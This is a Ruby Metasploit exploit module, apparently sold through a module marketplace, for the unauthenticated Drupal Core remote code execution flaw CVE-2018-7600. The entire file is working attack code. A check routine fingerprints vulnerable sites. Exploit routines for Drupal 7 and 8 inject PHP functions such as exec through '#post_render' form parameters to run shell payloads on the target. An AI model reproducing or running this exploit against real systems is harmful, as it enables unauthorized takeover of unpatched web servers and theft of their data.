##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Drupal Core Unauthenticated Remote Code Execution',
      'Description' => %q{
    This module exploits an unauthenticated remote code execution vulnerability in Drupal Core.

    Drupal Core versions <=8.5.0 and <=7.57 were vulnerable to an unauthenticated remote code
    execution vulnerability (SA-CORE-2018-002 / CVE-2018-7600). This module exploits the vulnerability
    in order to gain a remote shell. Tested against 7.56 and 8.5.0.

    Categories: Open Source

    Price: 10

    Video: https://asciinema.org/a/py4y0aaveNkXB2DHjqKS0BEY0

    OS: Multi

    Arch: Multi

    Requirements: Metasploit Framework
      },
      'Author' =>
        [
        ],
      'License' => 'VolatileMinds',
      'References' =>
        [
        ],
      'Privileged' => false,
      'Platform'   => ['unix', 'linux', 'windows', 'win'],
      'Arch'       => ARCH_CMD,
      'Payload'    =>
        {
          'BadChars' => "&\n=+%",
        },
      'Targets' =>
        [
          [ 'Drupal 8.x', { } ],
          [ 'Drupal 7.x', { } ]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'March 28 2018'))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Drupal path", '/']),
      ], self.class)
  end

  def check
    if target.name == 'Drupal 7.x'
      res = request7('printf', '%E')
      form_id = $1 if res.body =~ /<input type="hidden" name="form_build_id" value="(.*?)" \/>/

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, '/'),
        'method' => 'POST',
        'vars_get' => {
          'q' => 'file/ajax/name/#value/'+form_id
         },
         'vars_post' => {
           'form_build_id' => form_id
         }
      })
    elsif target.name == 'Drupal 8.x'
      res = request8('printf', '%E')
    end

    if res && res.body =~ /^1\.000000E\+0\[\{/
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    if target.name == 'Drupal 7.x'
      res = request7('exec', payload.encoded)
      form_id = $1 if res.body =~ /<input type="hidden" name="form_build_id" value="(.*?)" \/>/

      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, '/'),
        'method' => 'POST',
       'vars_get' => {
           'q' => 'file/ajax/name/#value/'+form_id
          },
         'vars_post' => {
            'form_build_id' => form_id
          }
       })

    elsif
      request8('exec', payload.encoded)
    end
  end

  def request7(func, arg)
    data = Rex::MIME::Message.new

    data.add_part('name', nil, nil, 'form-data; name="_triggering_element_name"')
    data.add_part('user_pass', nil, nil, 'form-data; name="form_id"')

    return send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'index.php'),
      'method' => 'POST',
      'vars_get' => {
        'q' => 'user/password',
        'name[#post_render][]' => func,
        'name[#type]' => 'markup',
        'name[#markup]' => arg
      },
      'data' => data.to_s,
      'ctype' => 'multipart/form-data; boundary='+data.bound,
    })
  end

  def request8(func, arg)
     data = Rex::MIME::Message.new

     data.add_part('user_register_form', nil, nil, 'form-data; name="form_id"')
     data.add_part('1', nil, nil, 'form-data; name="_drupal_ajax"')
     data.add_part(func, nil, nil, 'form-data; name="mail[#post_render][]"')
     data.add_part('markup', nil, nil, 'form-data; name="mail[type]"')
     data.add_part(arg, nil, nil, 'form-data; name="mail[#markup]"')

     return send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'),
       'method' => 'POST',
       'data' => data.to_s,
       'ctype' => 'multipart/form-data; boundary='+data.bound,
     })
  end
end
